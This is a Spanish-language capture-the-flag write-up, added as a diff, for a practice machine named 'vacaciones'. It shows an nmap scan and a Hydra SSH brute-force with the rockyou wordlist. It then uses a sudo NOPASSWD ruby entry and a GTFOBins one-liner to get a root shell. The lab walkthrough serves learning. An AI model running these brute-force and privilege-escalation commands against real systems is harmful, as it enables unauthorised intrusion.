@@ -1,0 +1,52 @@
+Guía para Penetration Testing: Escaneo y Escalada de Privilegios
+
+1. Preparación de la Máquina:
+   - Descarga de los archivos de la máquina desde https://mega.nz/file/YCEGAISD#y6iWUG_auH4vUApClb9ix7H6JmOCKm4vAYS2TjQn59g.
+   - Descompresión de los archivos descargados.
+   - Ejecución del comando `auto_deploy.sh vacaciones.tar` para arrancar la máquina en nuestro sistema.
+   - Apertura de una nueva ventana de comandos para dejar correr la máquina.
+
+2. Escaneo de la Red y Mapeo de Puertos:
+   - Realizamos un escaneo de puertos con `nmap`:
+     ```bash
+     nmap -p- -sS -sC -sV --min-rate 3000 -n -vvv -Pn 172.17.0.2 -oN /home/kali/Desktop/vacaciones/escaneo
+     ```
+
+3. Análisis de Servicios y Puertos Abiertos:
+   - Observamos que tiene un servicio SSH por el puerto 22 y un servicio Apache por el 80.
+   - Las versiones de estos son OpenSSH 7.6p1 y Apache httpd 2.4.29 respectivamente.
+
+4. Exploración de la Página Web:
+   - Al entrar a la web cliente, observamos una página en blanco.
+   - Al inspeccionarla, encontramos el siguiente mensaje:
+     <!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
+   - Tenemos dos nombres de usuario que podemos explotar mediante Hydra.
+
+5. Ataques de Fuerza Bruta:
+   - Utilizamos Hydra con un diccionario para encontrar las credenciales de SSH del usuario Camilo:
+     ```bash
+     hydra -L /home/kali/Desktop/vacaciones/users.txt -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 64
+     ```
+   - Obtenemos las credenciales: camilo / password1.
+
+6. Acceso y Escalada de Privilegios:
+   - Buceando por los directorios encontramos un correo con la contraseña del usuario Juan.
+   - Ingresamos con Juan y su contraseña. Al hacer `sudo -l`, recibimos lo siguiente:
+     ```
+     Matching Defaults entries for juan on 1ec4700d304f:
+         env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+     User juan may run the following commands on 1ec4700d304f:
+         (ALL) NOPASSWD: /usr/bin/ruby
+     ```
+   - Utilizamos el repositorio GTFOBins para buscar por Ruby y encontramos el siguiente comando para obtener acceso root:
+     ```
+     sudo ruby -e 'exec "/bin/sh"'
+     ```
+   
+7. Conclusión:
+   - Hemos obtenido acceso a la máquina mediante ataques de fuerza bruta y escalada de privilegios a través de la vulnerabilidad en Ruby.
+   - Es importante documentar todos los pasos realizados y los resultados obtenidos para futuras referencias y análisis.
+
+
+
